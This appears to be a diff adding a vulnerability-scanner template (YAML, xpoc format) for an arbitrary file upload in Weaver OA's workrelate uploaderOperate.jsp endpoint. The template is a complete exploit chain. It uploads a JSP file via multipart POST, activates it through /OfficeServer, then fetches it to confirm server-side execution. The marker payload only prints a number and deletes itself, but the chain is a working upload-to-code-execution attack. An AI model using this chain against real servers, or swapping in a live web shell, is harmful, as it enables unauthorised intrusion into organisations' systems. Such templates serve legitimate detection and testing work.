@@ -1,0 +1,40 @@
+id: weaver-oa-workrelate-file-upload
+
+info:
+  name: Weaver OA Workrelate File Upload
+  author: xpoc
+  severity: critical
+  verified: true
+  tags: weaver,oa,upload
+  created: 2023/06/22
+
+set:
+    s2: randomInt(10000000, 90000000)
+    s1: randomLowercase(20)
+rules:
+    r0:
+        request:
+            method: POST
+            path: /workrelate/plan/util/uploaderOperate.jsp
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+            body: "------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\nContent-Disposition: form-data; name=\"secId\"\r\n\r\n1\r\n------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"{{s1}}.jsp\"\r\n\r\n<% out.println(\"{{s2}}\"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r\n------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\nContent-Disposition: form-data; name=\"plandetailid\"\r\n\r\n1\r\n------WebKitFormBoundaryVdb2RRl25PuaGhWj--"
+        expression: response.status == 200 && response.body.bcontains(b"fileid")
+        output:
+            search: '"fileid=(?P<id1>.+?)>".bsubmatch(response.body)'
+            id1: search["id1"]
+            id: replaceAll(string(id1), "'", "")
+    r1:
+        request:
+            method: POST
+            path: /OfficeServer
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+            body: "------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\nContent-Disposition: form-data; name=\"aaa\"\r\n\r\n{\"OPTION\":\"INSERTIMAGE\",\"isInsertImageNew\":\"1\",\"imagefileid4pic\":\"{{id}}\"}\r\n------WebKitFormBoundaryVdb2RRl25PuaGhWj--"
+        expression: response.status == 200 && response.body.bcontains(bytes(string(s2)))
+    r2:
+        request:
+            method: GET
+            path: /{{s1}}.jsp
+        expression: response.status == 200 && response.body.bcontains(bytes(string(s2)))
+expression: r0() && r1() && r2()
